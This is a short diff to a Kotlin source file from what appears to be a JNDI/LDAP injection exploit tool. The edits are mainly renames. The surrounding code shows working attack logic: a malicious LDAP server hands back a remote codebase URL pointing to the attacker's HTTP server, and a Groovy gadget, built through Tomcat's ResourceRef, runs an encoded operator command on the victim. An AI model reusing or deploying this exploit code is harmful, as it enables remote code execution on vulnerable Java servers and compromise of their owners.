@@ -1,12 +1,14 @@
+@file:JvmName("gadgets")
+
 package ldap
 
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
 import com.unboundid.ldap.sdk.Entry
 import com.unboundid.ldap.sdk.LDAPResult
 import com.unboundid.ldap.sdk.ResultCode
-import http.PayloadGenerator
+import payload.PayloadGenerator
 import org.apache.naming.ResourceRef
-import util.Options
+import util.Option
 import util.base46cmd
 import util.serialize
 import util.toBase64
@@ -54,7 +56,7 @@ fun LDAPServer.tomcat(result: InMemoryInterceptedSearchResult, base: String, typ
 }
 
 fun LDAPServer.ref(result: InMemoryInterceptedSearchResult, base: String) {
-    val codeBaseUrl = "http://${Options.address}:${Options.httpPort}/"
+    val codeBaseUrl = "http://${Option.address}:${Option.httpPort}/"
 
     val entry = Entry(base)
     val javaFactory = base.substringAfterLast("/")
@@ -72,7 +74,7 @@ fun LDAPServer.ref(result: InMemoryInterceptedSearchResult, base: String) {
 }
 
 fun LDAPServer.groovy(result: InMemoryInterceptedSearchResult, base: String) {
-    val payload = "'${base46cmd(Options.command)}'.execute()"
+    val payload = "'${base46cmd(Option.command)}'.execute()"
 
     val ref = ResourceRef(
         "groovy.lang.GroovyShell", null, "", "",
